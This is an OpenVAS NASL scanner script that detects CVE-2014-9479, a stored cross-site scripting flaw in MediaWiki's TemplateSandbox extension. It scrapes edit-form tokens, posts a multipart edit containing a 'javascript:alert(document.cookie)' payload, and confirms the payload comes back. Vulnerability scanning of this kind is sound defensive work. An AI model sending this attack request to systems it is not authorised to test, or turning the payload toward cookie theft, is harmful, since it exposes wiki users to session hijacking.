###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_mediawiki_xss_templatesandbox_vuln.nasl 6709 2017-07-12 15:16:14Z cfischer $
#
# MediaWiki TemplateSandbox extension Cross-site scripting Vulnerability - Jan15
#
# Authors:
# Deependra Bapna <bdeependra@secpod.com>
#
# Copyright:
# Copyright (C) 2015 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:mediawiki:mediawiki";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.805328");
  script_version("$Revision: 6709 $");
  script_cve_id("CVE-2014-9479");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"$Date: 2017-07-12 17:16:14 +0200 (Wed, 12 Jul 2017) $");
  script_tag(name:"creation_date", value:"2015-01-27 17:16:42 +0530 (Tue, 27 Jan 2015)");
  script_name("MediaWiki TemplateSandbox extension Cross-site scripting Vulnerability - Jan15");

  script_tag(name:"summary", value:"This host is installed with TemplateSandbox
  extension for MediaWiki and is prone to cross-site scripting vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted HTTP POST request
  and check whether it is able to read cookie or not.");

  script_tag(name:"insight", value:"The flaw exist as input passed via
  text parameter to the 'Extension:TemplateSandbox'. script is
  not validated before returning it to users.");

  script_tag(name:"impact", value:"Successful exploitation will allow
  remote attacker to execute arbitrary script code in a user's browser
  session within the trust relationship between their browser and the server.

  Impact Level: Application");

  script_tag(name:"affected", value:"TemplateSandbox extension version before 1.24 for Mediawiki");

  script_tag(name:"solution", value:"Upgrade to TemplateSandbox extension version 1.24
  or later. For updates refer to http://www.mediawiki.org/wiki/Special:ExtensionDistributor/TemplateSandbox");

  script_tag(name:"solution_type", value:"VendorFix");
  script_xref(name : "URL" , value : "https://phabricator.wikimedia.org/T77625");
  script_xref(name : "URL" , value : "http://www.openwall.com/lists/oss-security/2015/01/03/13");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (C) 2015 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "secpod_mediawiki_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("mediawiki/installed");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

## Variable Initialization
req = "";
res = "";
dir = "";
reqwiki = "";
reswiki = "";
wikiPort = "";

if(!wikiPort = get_app_port(cpe:CPE)) exit(0);
if(!dir = get_app_location(cpe:CPE, port:wikiPort)) exit(0);

reqwiki = http_get(item:string(dir, "/index.php/Special:Version"), port:wikiPort);
reswiki = http_keepalive_send_recv(port:wikiPort, data:reqwiki);

## confirm the plugin
if (reswiki =~">TemplateSandbox<") {

   ## Vulnerable Url
   url =dir+"/index.php?title=Extension:TemplateSandbox&action=submit";
   reqwiki = http_get(item:url, port:wikiPort);
   reswiki = http_keepalive_send_recv(port:wikiPort, data:reqwiki);

   ## Get the session id
   wpStarttime = eregmatch(pattern:'value="([0-9]*)" name="wpStarttime"', string:reswiki);
   if(!wpStarttime[1]){
      exit(0);
   }
   wpEdittime = eregmatch(pattern:'value="([0-9]*)" name="wpEdittime"', string:reswiki);
   if(!wpEdittime[1]){
      exit(0);
   }

   wpAutoSummary = eregmatch(pattern:'value="([0-9a-zA-Z]*)" name="wpAutoSummary"', string:reswiki);
   if(!wpAutoSummary[1]){
      exit(0);
   }

   oldid = eregmatch(pattern:'value="([0-9a-zA-Z]*)" name="oldid"', string:reswiki);
   if(!oldid[1]){
      exit(0);
   }

   host = http_host_name(port:wikiPort);

   ## Construct the attack request
   postData = string('-----------------------------7523421607973306651860038372\r\n',
                     'Content-Disposition: form-data; name="wpAntispam"\r\n\r\n\r\n',
                     '-----------------------------7523421607973306651860038372\r\n',
                     'Content-Disposition: form-data; name="wpSection"\r\n\r\n\r\n',
                     '-----------------------------7523421607973306651860038372\r\n',
                     'Content-Disposition: form-data; name="wpStarttime"\r\n\r\n',
                     wpStarttime[1],'\r\n',
                     '-----------------------------7523421607973306651860038372\r\n',
                     'Content-Disposition: form-data; name="wpEdittime"\r\n\r\n',
                     wpEdittime[1],'\r\n',
                     '-----------------------------7523421607973306651860038372\r\n',
                     'Content-Disposition: form-data; name="wpScrolltop"\r\n\r\n0\r\n',
                     '-----------------------------7523421607973306651860038372\r\n',
                     'Content-Disposition: form-data; name="wpAutoSummary"\r\n\r\n',
                     wpAutoSummary,'\r\n',
                     '-----------------------------7523421607973306651860038372\r\n',
                     'Content-Disposition: form-data; name="oldid"\r\n\r\n',oldid[1],'\r\n',
                     '-----------------------------7523421607973306651860038372\r\n',
                     'Content-Disposition: form-data; name="wpTextbox1"\r\n\r\n',
                     '<buy name="do" url="javascript:alert(document.cookie)" >anything</buy>\r\n\r\n',
                     '-----------------------------7523421607973306651860038372\r\n',
                     'Content-Disposition: form-data; name="wpSummary"\r\n\r\n\r\n',
                     '-----------------------------7523421607973306651860038372\r\n',
                     'Content-Disposition: form-data; name="wpSave"\r\n\r\n',
                     'Save page\r\n',
                     '-----------------------------7523421607973306651860038372\r\n',
                     'Content-Disposition: form-data; name="wpEditToken"\r\n\r\n+\\\r\n',
                     '-----------------------------7523421607973306651860038372--\r\n');

   #Send Attack Request
   sndReq = string("POST ", url, " HTTP/1.1\r\n",
                   "Host: ", host, "\r\n",
                   "Content-Type: multipart/form-data;",
                   "boundary=---------------------------7523421607973306651860038372\r\n",
                   "Content-Length: ", strlen(postData), "\r\n\r\n",
                   "\r\n", postData, "\r\n");
   rcvRes = http_send_recv(port:wikiPort, data:sndReq);
   url = dir+"/index.php/Extension:TemplateSandbox";
   sndReq = http_get(item:url, port:wikiPort);
   rcvRes = http_keepalive_send_recv(port:wikiPort, data:sndReq);

   #Confirm Exploit
   if (rcvRes =~ "HTTP/1\.. 200" && "javascript:alert(document.cookie)" >< rcvRes)
   {
    security_message(wikiPort);
    exit(0);
   }
}